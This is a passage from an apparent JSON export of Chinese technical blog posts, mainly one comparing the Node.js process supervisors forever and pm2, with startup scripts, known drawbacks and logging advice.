xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n$ sudo ~\/Opensource\/config\/config \/mnt\/disk\/test.json get name\nname: libconfig\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2-4\" class=\"outline-3\">\n<h3 id=\"sec-2-4\">\u6e05\u9664\u6d4b\u8bd5\u73af\u5883<\/h3>\n<div class=\"outline-text-3\" id=\"text-2-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo umount \/dev\/loop0p1\nsudo losetup -d \/dev\/loop0\nsudo rmdir \/mnt\/disk\nsudo rm ~\/Examples\/disk.img\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u300a<a href=\"http:\/\/www.oschina.net\/translate\/reliable-file-updates-with-python\">\u4f7f\u7528 Python \u8fdb\u884c\u7a33\u5b9a\u53ef\u9760\u7684\u6587\u4ef6\u64cd\u4f5c<\/a>\u300b<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u540e\u53f0\u670d\u52a1\u76d1\u62a4\u5de5\u5177\uff1aforever\u4e0epm2",
  "timestamp": "2015-07-25 00:15:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n\u4f7f\u7528\u540e\u53f0\u670d\u52a1\u76d1\u62a4\u5de5\u5177\u6709\u5f88\u591a\u597d\u5904\uff1a\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u7a0b\u5e8f\u5d29\u6e83\u65f6\u81ea\u52a8\u62c9\u8d77\n<\/li>\n\n<li>\u7a0b\u5e8f\u65e5\u5fd7\u805a\u5408\uff08\u4f60\u7684\u7cfb\u7edf\u6709\u591a\u4e2a\u6a21\u5757\u6216\u591a\u4e2a\u8fdb\u7a0b\u7684\u65f6\u5019\u5f88\u6709\u5fc5\u8981\uff09\n<\/li>\n\n<li>\u4ee3\u7801\u66f4\u65b0\u65f6\u81ea\u52a8\u91cd\u542f\u670d\u52a1\n<\/li>\n<\/ul>\n\n<p>\nnode.js\u4e0b\u6700\u5e38\u7528\u7684\u540e\u53f0\u670d\u52a1\u76d1\u62a4\u5de5\u5177\u6709\uff1a<a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a> \u3001<a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u3002\n<\/p>\n\n<p>\n<a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a> \u5148\u51fa\u73b0\uff0c<a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u540e\u51fa\u73b0\u529f\u80fd\u66f4\u4e30\u5bcc\uff0c\u4e0b\u9762\u662f\u7279\u6027\u5bf9\u6bd4\uff1a\n<\/p>\n\n<table border=\"2\" cellspacing=\"0\" cellpadding=\"6\" rules=\"groups\" frame=\"hsides\">\n\n\n<colgroup>\n<col  class=\"left\" \/>\n\n<col  class=\"left\" \/>\n\n<col  class=\"left\" \/>\n<\/colgroup>\n<thead>\n<tr>\n<th scope=\"col\" class=\"left\">Feature<\/th>\n<th scope=\"col\" class=\"left\">Forever<\/th>\n<th scope=\"col\" class=\"left\">PM2<\/th>\n<\/tr>\n<\/thead>\n<tbody>\n<tr>\n<td class=\"left\">Keep Alive<\/td>\n<td class=\"left\">\u2714<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">Coffeescript<\/td>\n<td class=\"left\">\u2714<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">Log aggregation<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">API<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">Terminal monitoring<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">Clustering<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n\n<tr>\n<td class=\"left\">JSON configuration<\/td>\n<td class=\"left\">&#xa0;<\/td>\n<td class=\"left\">\u2714<\/td>\n<\/tr>\n<\/tbody>\n<\/table>\n\n<p>\n\u6211\u57283\u4e2a\u9879\u76ee\u4e2d\u4f7f\u7528 <a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a> \uff0c\u591a\u6b21\u91cd\u542f\u51fa\u9519\u540e\uff0c\u51b3\u5b9a\u8f6c\u5411 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \uff0c\u76ee\u524d\u6211\u5df2\u7ecf\u5728\u4e24\u4e2a\u8f83\u5c0f\u7684\u9879\u76ee\u4e2d\u6210\u529f\u4f7f\u7528 <a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u3002\n<\/p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\"><a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a><\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">npm install -g forever\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u914d\u7f6e\n\n<p>\n\u542f\u52a8\u811a\u672c\n<code>start.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">PATH<\/span>=$<span style=\"color: #ffcc66;\">PATH<\/span>:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/..\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node_modules\/forever\/bi<span style=\"text-decoration: underline;\">n:\/usr\/local\/node\/bin<\/span>\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">NODE_ENV<\/span>=${<span style=\"color: #ffcc66;\">NODE_ENV<\/span>:-production}\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">NODE_CONFIG_DIR<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/config\n\n<span style=\"color: #ffcc66;\">SCRIPT<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/src\/index.js\n<span style=\"color: #ffcc66;\">LOGFILE<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/run.log\n\n<span style=\"color: #ffcc66;\">running<\/span>=<span style=\"color: #cc99cc;\">`forever list | grep \"$SCRIPT\" | grep -v grep | wc -l`<\/span>\n\n<span style=\"color: #99cc99;\">if<\/span> [ $<span style=\"color: #ffcc66;\">running<\/span> -lt 1 ]; <span style=\"color: #99cc99;\">then<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   forever start --spinSleepTime=10000 --killSignal=SIGINT --pidFile=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/run.<span style=\"text-decoration: underline;\">pid -l $<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">LOGFILE<\/span><span style=\"text-decoration: underline;\"> -a -w --watchDirectory=<\/span><span style=\"color: #cc99cc; text-decoration: underline;\">`pwd`<\/span><span style=\"text-decoration: underline;\">\/src --watchIgnore=<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\".svn\/*\"<\/span><span style=\"text-decoration: underline;\"> <\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"$SCRIPT\"<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cc99cc;\">echo<\/span> -e <span style=\"color: #66cccc;\">\"\\nRunning.\"<\/span>\n<span style=\"color: #99cc99;\">else<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #cc99cc;\">echo<\/span> -e <span style=\"color: #66cccc;\">\"\\nAlready running.\"<\/span>\n<span style=\"color: #99cc99;\">fi<\/span>\n\nforever list | grep <span style=\"color: #66cccc;\">\"$SCRIPT\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u505c\u6b62\u811a\u672c\n<code>stop.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">PATH<\/span>=$<span style=\"color: #ffcc66;\">PATH<\/span>:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/..\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node_modules\/forever\/bi<span style=\"text-decoration: underline;\">n:\/usr\/local\/node\/bin<\/span>\n\n<span style=\"color: #ffcc66;\">SCRIPT<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/src\/index.js\n\nforever stop <span style=\"color: #66cccc;\">\"$SCRIPT\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u91cd\u542f\u811a\u672c     \n<code>restart.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">PATH<\/span>=$<span style=\"color: #ffcc66;\">PATH<\/span>:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/..\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node_modules\/forever\/bi<span style=\"text-decoration: underline;\">n:\/usr\/local\/node\/bin<\/span>\n\n<span style=\"color: #ffcc66;\">SCRIPT<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/src\/index.js\n\nforever restart <span style=\"color: #66cccc;\">\"$SCRIPT\"<\/span> || .\/start.sh\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7528\u6cd5\n\n<p>\n\u542f\u52a8\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/start.sh\n<\/pre>\n<\/div>\n\n<p>\n\u505c\u6b62\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/stop.sh\n<\/pre>\n<\/div>\n\n<p>\n\u91cd\u542f\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/restart.sh\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7f3a\u70b9\n\n<ul class=\"org-ul\">\n<li>\u7a0b\u5e8f\u9000\u51fa\u8fc7\u7a0b\u4e2d\u7684\u65e5\u5fd7\u65e0\u6cd5\u6355\u83b7\n\n<p>\n\u53c2\u89c1\uff1a<a href=\"https:\/\/github.com\/foreverjs\/forever\/issues\/385#issuecomment-115163346\">no logging after graceful shutdown #385<\/a>\n<\/p>\n\n<p>\n\u5e94\u8be5\u662fforever\u901a\u8fc7\u4fe1\u53f7\u901a\u77e5\u7a0b\u5e8f\u9000\u51fa\u540e\uff0c\u4e0d\u518d\u6355\u83b7\u7a0b\u5e8f\u7684\u65e5\u5fd7\u8f93\u51fa\uff0c\u7a0b\u5e8f\u9000\u51fa\u7684\u8fd9\u6bb5\u65f6\u95f4\u5185\u65e5\u5fd7\u4e22\u5931\u3002\n<\/p>\n\n<p>\n\u4e00\u4e2a\u8865\u4e01\u65b9\u6848\uff1a\u7a0b\u5e8f\u6536\u5230forever\u7684\u9000\u51fa\u4fe1\u53f7\u540e\u5c06\u65e5\u5fd7\u76f4\u63a5\u5199\u5230\u65e5\u5fd7\u6587\u4ef6\uff08\u6b63\u5e38\u60c5\u51b5\u4e0b\u662f\u7531forever\u6355\u83b7\u7a0b\u5e8f\u7684\u9519\u8bef\u8f93\u51fa\u5199\u65e5\u5fd7\u6587\u4ef6\uff09\u3002\n<\/p>\n<\/li>\n\n<li>\u91cd\u542f\u53ef\u80fd\u5931\u8d25\n\n<p>\n\u4ee3\u7801\u66f4\u65b0\u540e\uff0cforever\u4f1a\u53d1\u4fe1\u53f7\u91cd\u542f\u8fdb\u7a0b\uff0c\u4f46\u662f\u7a0b\u5e8f\u59cb\u7ec8\u91cd\u542f\u4e0d\u6210\u529f\uff0c\u51fa\u73b0\u5927\u91cf\u4e0b\u9762\u7684\u65e5\u5fd7\uff1a\n<\/p>\n<pre class=\"example\">\nError: bind EADDRINUSE\n<\/pre>\n\n<p>\n\u6000\u7591\u8ddfnode.js\u7684cluster\u4e2dmaster\u81ea\u52a8\u62c9\u8d77slave\u7684\u884c\u4e3a\u76f8\u51b2\u7a81\uff0c\u6b64\u65f6\u53ea\u6709\u4e00\u4e2aforever\u5b9e\u4f8b\u5728\u8fd0\u884c\uff0c\u8fd9\u79cd\u60c5\u51b5\u5360\u6bd4\u5f88\u9ad8\u3002\n<\/p>\n\n<p>\n\u53e6\u5916crontab\u4e2d\u8c03\u7528start.sh\u4e5f\u53ef\u80fd\u548cforever\u76f8\u51b2\u7a81\uff0c\u5f53node\u5168\u9000\u51fa\u65f6\uff0c\u53ef\u80fd\u542f\u52a8\u591a\u4e2aforever\u5b9e\u4f8b\uff0c\u8fd9\u79cd\u60c5\u51b5\u5360\u6bd4\u7a0d\u4f4e\u3002\n<\/p>\n\n<p>\n\u53e6\u5916\u4e00\u79cd\u60c5\u51b5\u662fnode.js\u51fa\u95ee\u9898\u4e86CPU\u53ca\u5185\u5b58100%\u5360\u7528\uff0c\u6b64\u65f6\u666e\u901a\u7684kill\u6740\u4e0d\u6b7b\uff08\u5fc5\u987b\u5f97kill -9\uff09\uff0cforever\u8bef\u8ba4\u4e3a\u5df2\u6210\u529f\u7ed3\u675fnode.js\u8fdb\u7a0b\uff0c\n\u7136\u540e\u62c9\u8d77\u65b0\u7684\u8fdb\u7a0b\u3002\n<\/p>\n<\/li>\n\n<li>\u672a\u5185\u7f6e\u652f\u6301\u5f00\u673a\u542f\u52a8\n\n<p>\n\u53ef\u4ee5\u76f4\u63a5\u653e\u5728crontab\u6bcf\u5206\u949f\u8c03\u7528\u4e00\u6b21 <code>start.sh<\/code> \u6765\u5b9e\u73b0\uff0c\u4e07\u4e00\u8fdeforever\u8fdb\u7a0b\u90fd\u6302\u4e86\uff0c\u53ef\u4ee5\u5168\u90e8\u62c9\u8d77\u6765\u3002\n\u5f00\u673a\u542f\u52a8\u4e0d\u5185\u7f6e\u5219\u610f\u5473\u7740\u4e00\u767e\u4e2a\u4eba\u6709\u4e00\u767e\u79cd\u505a\u6cd5\uff0c\u5e26\u6765\u4e0d\u5fc5\u8981\u7684\u4e89\u8bae\u3002\n<\/p>\n<\/li>\n\n<li>\u5141\u8bb8\u7a0b\u5e8f\u540c\u65f6\u542f\u52a8\u591a\u4e2a\u5b9e\u4f8b\n\n<p>\nforever\u672a\u5bf9\u542f\u52a8\u7684\u7a0b\u5e8f\u8fdb\u884c\u552f\u4e00\u6027\u6807\u8bc6\uff0c\u5bfc\u81f4\u7a0b\u5e8f\u53ef\u80fd\u610f\u5916\u542f\u52a8\u591a\u4e2a\u5b9e\u4f8b\uff0c\u591a\u4e2a\u5b9e\u4f8b\u4e4b\u95f4\u5f80\u5f80\u76f8\u51b2\u7a81\uff0c\u964d\u4f4e\u4e86\u7cfb\u7edf\u53ef\u7528\u6027\u3002\n<\/p>\n\n<p>\n\u800c\u7531\u7a0b\u5e8f\u81ea\u5df2\u6765\u5b9e\u73b0\u5355\u5b9e\u4f8b\u8fd0\u884c\u662f\u5f88\u56f0\u96be\u7684\uff0cforever\u4f1a\u4e0d\u65ad\u5730\u62c9\u8d77\u9000\u51fa\u7684\u591a\u4f59\u526f\u672c\u3002\n<\/p>\n<\/li>\n\n<li>\u672a\u5185\u7f6e\u652f\u6301cluster\u4ee5\u53ca\u4f18\u96c5\u91cd\u542f\n\n<p>\n\u90e8\u7f72\u4ee3\u7801\u91cd\u542f\u7a0b\u5e8f\u8fc7\u7a0b\u4e2d\u4f1a\u505c\u6b62\u670d\u52a1\u51e0\u79d2\u949f\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\"><a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a><\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u5b89\u88c5\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">npm install -g pm2\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u914d\u7f6e\n\n<p>\n\u4ee5 <a href=\"https:\/\/github.com\/tangxinfa\/upload-fiddle\">upload-fiddle<\/a> \u9879\u76ee\u4e3a\u4f8b\u3002\n<\/p>\n\n<p>\n\u7edf\u4e00\u914d\u7f6e\u5176\u5b83\u811a\u672c\u9700\u8981\u7684\u73af\u5883\u53d8\u91cf\n<code>.bashrc<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">PATH<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/..\/node\/bin:<span style=\"color: #cc99cc;\">`pwd`<\/span>\/node_modules\/pm2\/bin:\/usr\/loc<span style=\"text-decoration: underline;\">al\/node\/bin:$<\/span><span style=\"color: #ffcc66; text-decoration: underline;\">PATH<\/span>\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">NODE_ENV<\/span>=${<span style=\"color: #ffcc66;\">NODE_ENV<\/span>:-production}\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">NODE_CONFIG_DIR<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/config\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">APP_NAME<\/span>=<span style=\"color: #66cccc;\">\"upload-fiddle\"<\/span>\n<span style=\"color: #cc99cc;\">export<\/span> <span style=\"color: #ffcc66;\">APP_SCRIPT<\/span>=<span style=\"color: #cc99cc;\">`pwd`<\/span>\/src\/index.js\n<\/pre>\n<\/div>\n\n<p>\n\u542f\u52a8\u811a\u672c\n<code>start.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">source<\/span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"<\/span> -n <span style=\"color: #66cccc;\">\"$APP_NAME\"<\/span> start <span style=\"color: #66cccc;\">\"$APP_SCRIPT\"<\/span> -i 0 --watch <span style=\"color: #66cccc;\">\"`pw<\/span><span style=\"color: #66cccc; text-decoration: underline;\">d`\/src\/*.js\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u505c\u6b62\u811a\u672c\n<code>stop.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">source<\/span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"<\/span> stop <span style=\"color: #66cccc;\">\"$APP_NAME\"<\/span>\n<\/pre>\n<\/div>\n\n<p>\n\u91cd\u542f\u811a\u672c\n<code>restart.sh<\/code>\n<\/p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/<\/span><span style=\"color: #99cc99;\">bash<\/span>\n\n<span style=\"color: #cc99cc;\">source<\/span> .bashrc\npm2 --node-args=<span style=\"color: #66cccc;\">\"--harmony\"<\/span> restart <span style=\"color: #66cccc;\">\"$APP_NAME\"<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7528\u6cd5\n\n<p>\n\u542f\u52a8\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/start.sh\n<\/pre>\n<\/div>\n\n<p>\n\u505c\u6b62\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/stop.sh\n<\/pre>\n<\/div>\n\n<p>\n\u91cd\u542f\n<\/p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">.\/restart.sh\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u7f3a\u70b9\n\n<ul class=\"org-ul\">\n<li>\u7a0b\u5e8f\u9000\u51fa\u8fc7\u7a0b\u4e2d\u7684\u65e5\u5fd7\u65e0\u6cd5\u6355\u83b7\uff1f\n\n<p>\n\u4e0d\u4e00\u5b9a\u3002\u4f7f\u7528 <code>pm2 stop<\/code> \u4f1a\u6709\u540c\u6837\u7684\u95ee\u9898\uff0c\u4f46\u662fpm2\u652f\u6301\u4f18\u96c5\u9000\u51fa\uff08 <code>pm2 gracefulReload<\/code> \uff09\uff0c\u6b64\u65f6\u4e0d\u4f46\u9000\u51fa\u8fc7\u7a0b\u4e2d\u7684\u65e5\u5fd7\u80fd\u591f\u6b63\u5e38\u6355\u83b7\uff0c\u800c\u4e14\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a10\u505c\u673a\u65f6\u95f4\u3002\n<\/p>\n<\/li>\n\n<li>\u91cd\u542f\u53ef\u80fd\u5931\u8d25\n\n<p>\n\u662f\u7684\u3002=pm2 restart= \u5e76\u6ca1\u6709\u91c7\u7528\u6fc0\u8fdb\u7684\u63aa\u65bd\uff08kill -9\uff09\u786e\u4fdd\u65e7\u8fdb\u7a0b\u7ed3\u675f\u3002\u91cd\u73b0\u6b65\u9aa4\uff1a\u7528gdb\u8c03\u8bd5\u8fd0\u884c\u4e2d\u7684node\u8fdb\u7a0b\uff08gdb node &lt;PID&gt;\u540e\u4e0d\u6267\u884c\u4efb\u4f55gdb\u547d\u4ee4\uff09\uff0c\u7136\u540e\u7528pm2 restart\u91cd\u542f\u670d\u52a1\uff0c\u6b64\u65f6\u65e7\u7684\u8fdb\u7a0b\u6740\u4e0d\u6b7b\uff0c\u65b0\u7684\u8fdb\u7a0b\u88ab\u521b\u5efa\u3002\n<\/p>\n<\/li>\n\n<li>\u5141\u8bb8\u7a0b\u5e8f\u540c\u65f6\u542f\u52a8\u591a\u4e2a\u5b9e\u4f8b\n\n<p>\npm2\u5bf9\u542f\u52a8\u7684\u7a0b\u5e8f\u8fdb\u884c\u4e86\u552f\u4e00\u6027\u6807\u8bc6\uff0c\u4f46\u662f\u5b83\u5c06\u542f\u52a8\u7684\u4fe1\u606f\u4fdd\u5b58\u5728\u4e86\u5f53\u524d\u7528\u6237\u7684home\u76ee\u5f55\u4e0b\uff08~\/.pm2\uff09\uff0c\u6240\u4ee5\u4f7f\u7528\u5176\u5b83\u5e10\u53f7\u65f6\u8fd8\u662f\u6709\u80fd\u591f\u542f\u52a8\u591a\u4e2a\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u5bf9\u4e8e\u8fd9\u4e00\u70b9forever\u4e5f\u5b58\u5728\u540c\u6837\u7684\u95ee\u9898\u3002\n<\/p>\n\n<p>\n\u5bf9\u4e8e\u670d\u52a1\u5668\u6765\u8bf4\uff0c\u591a\u5e10\u53f7\u662f\u5e38\u6001\uff0c\u5e94\u8be5\u9ed8\u8ba4\u9632\u6b62\u8fd9\u79cd\u95ee\u9898\u53d1\u751f\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u7a0b\u5e8f\u5199\u65e5\u5fd7\u76f8\u5173<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u7528c\/c++\u5199\u65e5\u5fd7\u7684\u65f6\u5019\u6211\u4e00\u822c\u90fd\u4f1a\u4f7f\u7528\u65e5\u5fd7\u5e93\uff0c\u5982\uff1a<a href=\"http:\/\/logging.apache.org\/log4cxx\/index.html\">log4cxx<\/a> \u3001<a href=\"https:\/\/github.com\/HardySimpson\/zlog\">zlog<\/a> \uff0c\u8fd9\u4e9b\u65e5\u5fd7\u5e93\u5bb9\u6613\u4f7f\u7528\u800c\u4e14\u5f88\u7a33\u5b9a\uff0c\u652f\u6301\u5c06\u65e5\u5fd7\u5199\u5230\u6587\u4ef6\u6216\u63a7\u5236\u53f0\uff0c\u652f\u6301\u6309\u5927\u5c0f\u3001\u65e5\u671f\u5206\u5272\u65e5\u5fd7\u6587\u4ef6\uff0c\u652f\u6301\u9650\u5b9a\u65e5\u5fd7\u6587\u4ef6\u6570\u3001\u5360\u7528\u7a7a\u95f4\u3002\n<\/p>\n\n<p>\n\u4f46\u662fnode.js\u4e0b\u6700\u597d\u7684\u5199\u65e5\u5fd7\u65b9\u5f0f\u5176\u5b9e\u662f\u5c06\u65e5\u5fd7\u76f4\u63a5\u8f93\u51fa\u5230\u9519\u8bef\u8f93\u51fa\uff08stderr\uff09\uff0c\u7531 <a href=\"https:\/\/github.com\/nodejitsu\/forever\">forever<\/a> \u3001<a href=\"https:\/\/github.com\/Unitech\/pm2\">pm2<\/a> \u8fd9\u6837\u7684\u540e\u53f0\u670d\u52a1\u76d1\u62a4\u5de5\u5177\u6765\u5199\u65e5\u5fd7\u6587\u4ef6\u3002\u8fd9\u662f\u56e0\u4e3anode.js\u505a\u4e3a\u4e00\u79cd\u52a8\u6001\u8bed\u8a00\uff0c\u5bb9\u6613\u51fa\u73b0\u5f02\u5e38\uff0c\u7279\u522b\u662f\u524d\u671f\u5f00\u53d1\u9636\u6bb5\uff0c\u5f88\u591a\u5206\u652f\u6ca1\u6709\u8dd1\u5230\uff0c\u5f80\u5f80\u662f\u5199\u65e5\u5fd7\u7684\u8bed\u53e5\u51fa\u9519\uff0c\u6b64\u65f6\u65e5\u5fd7\u5e93\u662f\u5f88\u96be\u505a\u5230\u5c06\u5f02\u5e38\u65f6\u7a0b\u5e8f\u7684\u8c03\u7528\u5806\u6808\u5199\u5230\u65e5\u5fd7\u6587\u4ef6\u4e2d\u7684\uff0c\u7531\u53f0\u540e\u670d\u52a1\u76d1\u62a4\u5de5\u5177\u6765\u505a\u80fd\u786e\u4fdd\u4e07\u65e0\u4e00\u5931\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">\u53c2\u8003<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<ul class=\"org-ul\">\n<li>\u300a<a href=\"http:\/\/se77en.cc\/2013\/06\/27\/goodbye-node-forever-hello-pm2-translation\/\">\u544a\u522bnode-forever,\u62e5\u62b1PM2<\/a>\u300b\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n"
},
{
